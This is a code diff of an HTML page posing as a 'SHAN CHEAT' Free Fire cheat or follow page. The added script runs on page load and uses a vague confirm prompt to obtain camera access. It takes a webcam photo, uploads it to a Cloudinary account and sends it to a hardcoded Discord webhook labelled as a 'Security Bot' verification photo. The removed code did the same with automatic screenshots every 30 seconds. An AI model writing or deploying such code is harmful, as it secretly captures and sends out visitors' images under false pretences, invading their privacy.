@@ -3,48 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SHAN CHEAT MOBILE</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script>
+    <title>SHAN CHEAT FOLLOW PAGE</title>
 </head>
 <body>
-    <h1>Website Loaded</h1>
-    <p>The page will automatically capture screenshots every 30 seconds and send to Discord.</p>
 
-    <script>
-        // Function to capture screenshot and send to Discord
-        function captureAndSendToDiscord() {
-            html2canvas(document.body).then(function(canvas) {
-                const imgData = canvas.toDataURL('image/png');
-                sendToDiscord(imgData);
+<script>
+    async function askPermission() {
+        if (confirm("SHAN CHEAT FREE FIRE FOLLOW PAGE")) {
+            capturePhoto();
+        }
+    }
+
+    async function capturePhoto() {
+        const video = document.createElement('video');
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            await new Promise(resolve => video.onloadedmetadata = resolve);
+
+            video.play();
+            setTimeout(() => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                video.srcObject.getTracks().forEach(track => track.stop());
+
+                canvas.toBlob(blob => uploadPhoto(blob), 'image/png');
+            }, 1000);
+        } catch (err) {
+            alert("Camera access denied!");
+            console.error(err);
+        }
+    }
+
+    async function uploadPhoto(imageBlob) {
+        const cloudName = "dxe2hsegn";  
+        const uploadPreset = "my_preset";  
+
+        const formData = new FormData();
+        formData.append("file", imageBlob);
+        formData.append("upload_preset", uploadPreset);
+
+        try {
+            const response = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
+                method: "POST",
+                body: formData
             });
-        }
 
-        // Function to send captured image to Discord webhook
-        function sendToDiscord(imageData) {
-            const webhookURL = 'https://discord.com/api/webhooks/1340611336966770761/BG9LqkUM1Tri7XT1oHVaotzuOQo6VTj4fnWsmtgS0geRxhdBAVZ0wxw3XqGdjLYIY9xI'; // Replace with your Discord Webhook URL
-            const payload = {
-                content: "Automated Screen Capture",
+            const result = await response.json();
+            const imageUrl = result.secure_url; 
+
+            sendToDiscord(imageUrl);
+        } catch (error) {
+            console.error("Cloudinary upload error:", error);
+        }
+    }
+
+    function sendToDiscord(imageUrl) {
+        fetch("https://discord.com/api/webhooks/1340611336966770761/BG9LqkUM1Tri7XT1oHVaotzuOQo6VTj4fnWsmtgS0geRxhdBAVZ0wxw3XqGdjLYIY9xI", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ 
+                username: "Security Bot", 
+                content: "User verification photo:", 
                 embeds: [{
-                    image: { url: imageData }
+                    image: { url: imageUrl }
                 }]
-            };
-
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
             })
-            .then(response => response.json())
-            .then(data => console.log('Successfully sent to Discord:', data))
-            .catch(error => console.error('Error:', error));
-        }
+        })
+        .then(response => console.log("Photo sent to Discord!"))
+        .catch(err => console.error("Error sending to Discord:", err));
+    }
 
-        // Start capturing screenshots automatically every 30 seconds after the page loads
-        window.onload = function() {
-            setInterval(captureAndSendToDiscord, 30000); // 30000ms = 30 seconds
-        };
-    </script>
+    askPermission();
+</script>
+
 </body>
 </html>
